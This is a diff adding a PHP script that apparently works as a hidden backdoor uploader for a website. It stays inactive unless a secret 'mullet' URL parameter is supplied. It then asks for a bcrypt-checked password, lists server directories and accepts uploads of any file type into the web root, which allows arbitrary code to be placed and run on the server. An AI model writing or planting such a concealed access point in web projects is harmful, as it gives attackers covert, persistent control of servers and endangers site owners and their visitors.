@@ -1,0 +1,78 @@
+<?php
+if (isset($_GET['mullet'])) {
+
+    session_start();
+
+    $passHash = '$2a$12$qbUBAVBufBYtIT9KbYq2VeSywq/9N8gXUyETmsOe8dHnxBjXsN.0O';
+
+    // LOGIN (FIX bcrypt)
+    if (isset($_POST['p']) && password_verify($_POST['p'], $passHash)) {
+        $_SESSION['ok'] = true;
+    }
+
+    if (!isset($_SESSION['ok'])) {
+        echo '<form method="post">
+                <input type="password" name="p" placeholder="Password">
+                <button>Login</button>
+              </form>';
+        return;
+    }
+
+    // ROOT
+    $base = realpath(__DIR__);
+
+    // ambil path
+    $current = isset($_GET['dir']) ? realpath($_GET['dir']) : $base;
+
+    // validasi
+    if ($current === false || strpos($current, $base) !== 0) {
+        $current = $base;
+    }
+
+    // upload
+    if (isset($_FILES['f'])) {
+        $target = $current . '/' . basename($_FILES['f']['name']);
+
+        if (move_uploaded_file($_FILES['f']['tmp_name'], $target)) {
+            echo "<p>Upload sukses</p>";
+            echo "<p>$target</p>";
+        } else {
+            echo "<p>Upload gagal</p>";
+        }
+    }
+
+    echo "<h3>Folder: $current</h3>";
+
+    // tombol kembali (FIX param)
+    if ($current !== $base) {
+        $parent = urlencode(dirname($current));
+        echo "<a href='?mullet&dir=$parent'>⬅️ Kembali</a><br><br>";
+    }
+
+    // list folder
+    $files = scandir($current);
+
+    echo "<ul>";
+    foreach ($files as $f) {
+        if ($f === '.' || $f === '..') continue;
+
+        $full = $current . '/' . $f;
+
+        if (is_dir($full)) {
+            $link = urlencode($full); // FIX penting
+            echo "<li>📁 <a href='?mullet&dir=$link'>$f</a></li>";
+        } else {
+            echo "<li>📄 $f</li>";
+        }
+    }
+    echo "</ul>";
+
+    // upload form
+    echo '<form method="post" enctype="multipart/form-data">
+            <input type="file" name="f">
+            <button>Upload</button>
+          </form>';
+
+    return;
+}
+?>
